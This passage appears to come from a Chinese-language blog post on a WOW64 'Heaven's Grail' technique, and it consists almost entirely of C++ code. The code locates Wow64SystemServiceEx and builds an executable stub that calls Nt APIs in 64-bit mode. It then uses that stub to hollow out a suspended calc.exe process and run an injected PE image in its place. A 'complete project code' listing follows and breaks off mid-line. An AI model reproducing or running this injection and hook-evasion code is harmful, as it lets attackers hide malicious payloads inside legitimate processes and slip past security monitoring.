<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">getPtr_Wow64SystemServiceEx</span><span class="params">(UINT64 &amp;value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ptr_wow64Mod = <span class="built_in">getPtr_Module64</span>(<span class="string">L&quot;wow64.dll&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[v] current wow64.dll @ %llx\n&quot;</span>, ptr_wow64Mod);</span><br><span class="line">    <span class="type">char</span> exeBuf[<span class="number">4096</span>];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)&amp;exeBuf, ptr_wow64Mod, <span class="built_in">sizeof</span>(exeBuf));</span><br><span class="line">    <span class="keyword">auto</span> k = <span class="built_in">PIMAGE_NT_HEADERS64</span>(&amp;exeBuf[<span class="number">0</span>] + <span class="built_in">PIMAGE_DOS_HEADER</span>(exeBuf)-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">auto</span> rvaExportTable = k-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)&amp;exeBuf, ptr_wow64Mod + rvaExportTable, <span class="built_in">sizeof</span>(exeBuf));</span><br><span class="line">    <span class="keyword">auto</span> numOfNames = <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;NumberOfNames;</span><br><span class="line">    <span class="keyword">auto</span> arrOfNames = <span class="keyword">new</span> UINT32[numOfNames + <span class="number">1</span>], arrOfFuncs = <span class="keyword">new</span> UINT32[numOfNames + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">auto</span> addrOfNameOrds = <span class="keyword">new</span> UINT16[numOfNames + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)arrOfNames, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfNames, <span class="built_in">sizeof</span>(UINT32) * numOfNames);</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)addrOfNameOrds, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfNameOrdinals, <span class="built_in">sizeof</span>(UINT16) * numOfNames);</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG)arrOfFuncs, ptr_wow64Mod + <span class="built_in">PIMAGE_EXPORT_DIRECTORY</span>(exeBuf)-&gt;AddressOfFunctions, <span class="built_in">sizeof</span>(UINT32) * numOfNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; numOfNames; i++) &#123;</span><br><span class="line">        <span class="keyword">auto</span> currApiName = <span class="built_in">get64b_CSTR</span>(ptr_wow64Mod + arrOfNames[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[v] found export API -- %s\n&quot;</span>, currApiName.<span class="built_in">c_str</span>());</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(<span class="string">&quot;Wow64SystemServiceEx&quot;</span>, currApiName.<span class="built_in">c_str</span>()))</span><br><span class="line">            value = ptr_wow64Mod + arrOfFuncs[addrOfNameOrds[i]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>天堂圣杯核心函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">NtAPI</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szNtApiToCall, ...)</span> </span>&#123;</span><br><span class="line">    PCHAR jit_stub;</span><br><span class="line">    PCHAR apiAddr = <span class="built_in">PCHAR</span>(<span class="built_in">getBytecodeOfNtAPI</span>(szNtApiToCall));</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title">ptrTranslator</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (!ptrTranslator)</span><br><span class="line">        <span class="built_in">getPtr_Wow64SystemServiceEx</span>(ptrTranslator); <span class="comment">//取得天堂翻译机地址并保存</span></span><br><span class="line">    <span class="type">static</span> <span class="type">uint8_t</span> stub_template[] = &#123;</span><br><span class="line">        <span class="comment">/* +00 - mov eax, 00000000      */</span> <span class="number">0xB8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">        <span class="comment">/* +05 - mov edx, ds:[esp+0x4]  */</span> <span class="number">0x8b</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x04</span>,</span><br><span class="line">        <span class="comment">/* +09 - mov    ecx,eax         */</span> <span class="number">0x89</span>, <span class="number">0xC1</span>,</span><br><span class="line">        <span class="comment">/* +0B - enter 64 bit mode      */</span> <span class="number">0x6A</span>, <span class="number">0x33</span>, <span class="number">0xE8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x83</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x05</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="comment">/* +17 - xchg r14, rsp */</span>        <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xE6</span>,</span><br><span class="line">        <span class="comment">/* +1A - call qword ptr [DEADBEEF] */</span> <span class="number">0xFF</span>, <span class="number">0x14</span>, <span class="number">0x25</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">        <span class="comment">/* +21 - xchg r14, rsp */</span> <span class="number">0x49</span>, <span class="number">0x87</span>, <span class="number">0xE6</span>,</span><br><span class="line">        <span class="comment">/* +24 - exit 64 bit mode  */</span> <span class="number">0xE8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0xC7</span>,<span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">4</span>, <span class="number">0x23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x83</span>, <span class="number">4</span>, <span class="number">0x24</span>, <span class="number">0xD</span>, <span class="number">0xCB</span>,</span><br><span class="line">        <span class="number">0xc3</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    jit_stub = (PCHAR)<span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="built_in">sizeof</span>(stub_template), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(jit_stub, stub_template, <span class="built_in">sizeof</span>(stub_template));</span><br><span class="line">    va_list    args;</span><br><span class="line">    <span class="built_in">va_start</span>(args, szNtApiToCall);</span><br><span class="line">    *((<span class="type">uint32_t</span>*)&amp;jit_stub[<span class="number">0x01</span>]) = *(<span class="type">uint32_t</span>*)&amp;apiAddr[<span class="number">1</span>];</span><br><span class="line">    *((<span class="type">uint32_t</span>*)&amp;jit_stub[<span class="number">0x1d</span>]) = (<span class="type">size_t</span>)&amp;ptrTranslator;</span><br><span class="line">    <span class="keyword">auto</span> ret = ((<span class="built_in">NTSTATUS</span>(__cdecl*)(...))jit_stub)(args);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>滥用天堂翻译机达成的Process Hollowing技巧如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">RunPortableExecutable</span><span class="params">(<span class="type">void</span>* Image)</span> </span>&#123;</span><br><span class="line">    IMAGE_DOS_HEADER* DOSHeader; <span class="comment">// For Nt DOS Header symbols</span></span><br><span class="line">    IMAGE_NT_HEADERS* NtHeader; <span class="comment">// For Nt PE Header objects &amp; symbols</span></span><br><span class="line">    IMAGE_SECTION_HEADER* SectionHeader;</span><br><span class="line">    PROCESS_INFORMATION PI;</span><br><span class="line">    STARTUPINFOA SI;</span><br><span class="line">    CONTEXT* CTX;</span><br><span class="line">    DWORD* ImageBase; <span class="comment">//Base address of the image</span></span><br><span class="line">    <span class="type">void</span>* pImageBase; <span class="comment">// Pointer to the image base</span></span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    <span class="type">char</span> CurrentFilePath[<span class="number">1024</span>] = <span class="string">&quot;C:\\Windows\\SysWOW64\\calc.exe&quot;</span>;</span><br><span class="line">    DOSHeader = <span class="built_in">PIMAGE_DOS_HEADER</span>(Image); <span class="comment">// Initialize Variable</span></span><br><span class="line">    NtHeader = <span class="built_in">PIMAGE_NT_HEADERS</span>(<span class="built_in">DWORD</span>(Image) + DOSHeader-&gt;e_lfanew); <span class="comment">// Initialize</span></span><br><span class="line">    <span class="keyword">if</span> (NtHeader-&gt;Signature == IMAGE_NT_SIGNATURE) &#123;<span class="comment">// Check if image is a PE File.</span></span><br><span class="line">        <span class="built_in">ZeroMemory</span>(&amp;PI, <span class="built_in">sizeof</span>(PI)); <span class="comment">// Null the memory</span></span><br><span class="line">        <span class="built_in">ZeroMemory</span>(&amp;SI, <span class="built_in">sizeof</span>(SI)); <span class="comment">// Null the memory</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">CreateProcessA</span>(CurrentFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;SI, &amp;PI)) &#123;</span><br><span class="line">            <span class="comment">// Allocate memory for the context.</span></span><br><span class="line">            CTX = <span class="built_in">LPCONTEXT</span>(<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(CTX), MEM_COMMIT, PAGE_READWRITE));</span><br><span class="line">            CTX-&gt;ContextFlags = CONTEXT_FULL; <span class="comment">// Context is allocated</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">GetThreadContext</span>(PI.hThread, <span class="built_in">LPCONTEXT</span>(CTX))) &#123;<span class="comment">//if context is in thread</span></span><br><span class="line">                pImageBase = <span class="built_in">VirtualAllocEx</span>(PI.hProcess, <span class="built_in">LPVOID</span>(NtHeader-&gt;OptionalHeader.ImageBase), NtHeader-&gt;OptionalHeader.SizeOfImage, <span class="number">0x3000</span>, PAGE_EXECUTE_READWRITE);</span><br><span class="line">                <span class="keyword">if</span> (pImageBase == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">NtAPI</span>(<span class="string">&quot;ZwTerminateProcess&quot;</span>, PI.hProcess, <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Write the image to the process</span></span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtWriteVirtualMemory&quot;</span>, PI.hProcess, pImageBase, Image, NtHeader-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>);</span><br><span class="line">                <span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; NtHeader-&gt;FileHeader.NumberOfSections; count++) &#123;</span><br><span class="line">                    SectionHeader = <span class="built_in">PIMAGE_SECTION_HEADER</span>(<span class="built_in">DWORD</span>(Image) + DOSHeader-&gt;e_lfanew + <span class="number">248</span> + (count * <span class="number">40</span>));</span><br><span class="line">                    <span class="built_in">NtAPI</span>(<span class="string">&quot;NtWriteVirtualMemory&quot;</span>, PI.hProcess, <span class="built_in">LPVOID</span>(<span class="built_in">DWORD</span>(pImageBase) + SectionHeader-&gt;VirtualAddress), <span class="built_in">LPVOID</span>(<span class="built_in">DWORD</span>(Image) + SectionHeader-&gt;PointerToRawData), SectionHeader-&gt;SizeOfRawData, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtWriteVirtualMemory&quot;</span>, PI.hProcess, <span class="built_in">LPVOID</span>(CTX-&gt;Ebx + <span class="number">8</span>), <span class="built_in">PVOID</span>(&amp;NtHeader-&gt;OptionalHeader.ImageBase), <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="comment">// Move address of entry point to the eax register</span></span><br><span class="line">                CTX-&gt;Eax = <span class="built_in">DWORD</span>(pImageBase) + NtHeader-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtSetContextThread&quot;</span>, PI.hThread, CTX); <span class="comment">// Set the context</span></span><br><span class="line">                DWORD useless;</span><br><span class="line">                <span class="built_in">NtAPI</span>(<span class="string">&quot;NtResumeThread&quot;</span>, PI.hThread, &amp;useless); <span class="comment">//´Start the process/call main()</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Operation was successful.</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>完整项目代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wowGrail.cpp</span></span><br><span class="line"><span class="comment">//   Compile It in Release mode, if you&#x27;re using MSVC toolchain. due to MSVC&#x27;s performance instrumentation in Debug mode, there&#x27;ll be an unexpected memory layout.</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;wow64ext.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">auto</span> memcpy64 = ((<span class="built_in">void</span>(cdecl*)(ULONG64, ULONG64, ULONG64))((PCSTR)</span><br><span class="line">    <span class="comment">// enter 64 bit mode 切换至64位模式</span></span><br><span class="line">    <span class="string">&quot;\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb&quot;</span></span><br><span class="line">    <span class="comment">// memcpy for 64 bit 读取起点RSI 写入起点RDI 拷贝用rep movs [rdi],[rsi]</span></span><br><span class="line">    <span class="string">&quot;\x67\x48\x8b\x7c\x24\x04\x67\x48\x8b\x74\x24\x0c\x67\x48\x8b\x4c\x24\x14\xf3\xa4&quot;</span></span><br><span class="line">    <span class="comment">// exit 64 bit mode 切换回64位模式</span></span><br><span class="line">    <span class="string">&quot;\xe8\x00\x00\x00\x00\xc7\x44\x24\x04\x23\x00\x00\x00\x83\x04\x24\x0d\xcb\xc3&quot;</span></span><br><span class="line">));</span><br><span class="line"><span class="function">PEB64* <span class="title">getPtr_Peb64</span><span class="params">()</span> </span>&#123; <span class="comment">//泄露当前WOW64进程中64位PEB环境资讯块位址</span></span><br><span class="line">    <span class="keyword">return</span> ((PEB64 * (*)()) &amp; <span class="string">&quot;\x65\xA1\x60\x00\x00\x00\xC3&quot;</span>)(); <span class="comment">// mov eax,gs:[00000060]; ret</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">get64b_CSTR</span><span class="params">(ULONG64 ptr64bStr)</span> </span>&#123; <span class="comment">//将4GB位址以上的字符数组字符串或宽字符数组字符串拷贝到32位变数中 以string资料结构储存</span></span><br><span class="line">    CHAR szBuf[MAX_PATH];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG64)&amp;szBuf, ptr64bStr, <span class="built_in">sizeof</span>(szBuf));</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">new</span> <span class="built_in">string</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">wstring <span class="title">get64b_WSTR</span><span class="params">(ULONG64 ptr64bStr)</span> </span>&#123; <span class="comment">//将4GB位址以上的字符数组字符串或宽字符数组字符串拷贝到32位变数中 以wstring资料结构储存</span></span><br><span class="line">    WCHAR szBuf[MAX_PATH];</span><br><span class="line">    <span class="built_in">memcpy64</span>((ULONG64)&amp;szBuf, ptr64bStr, <span class="built_in">sizeof</span>(szBuf));</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">new</span> <span class="built_in">wstring</span>(szBuf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">UINT64 <span class="title">getPtr_Module64</span><span class="params">(<span class="type">const</span> <span class="type">wchar_t</span>* szDllName)</span> </span>&#123; <span class="comment">//泄露任意指定名称的64位DLL映像基址</span></span><br><span class="line">    PEB_LDR_DATA64 ldrNode = &#123;&#125;;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY64 currNode = &#123;&#125;;</span><br><span class="line">    <span 